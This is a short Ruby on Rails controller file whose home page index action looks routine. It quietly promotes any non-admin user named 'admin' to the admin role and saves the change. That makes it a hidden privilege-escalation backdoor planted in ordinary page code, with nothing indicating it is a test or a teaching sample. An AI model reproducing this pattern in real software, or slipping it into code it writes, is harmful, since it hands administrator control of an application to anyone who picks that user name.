class HomeController < ApplicationController
  layout 'standard'
  def index
    @user = current_user
    return unless @user.admin? == false && @user.name == 'admin'

    @user.role = 'admin'
    @user.save
  end
end
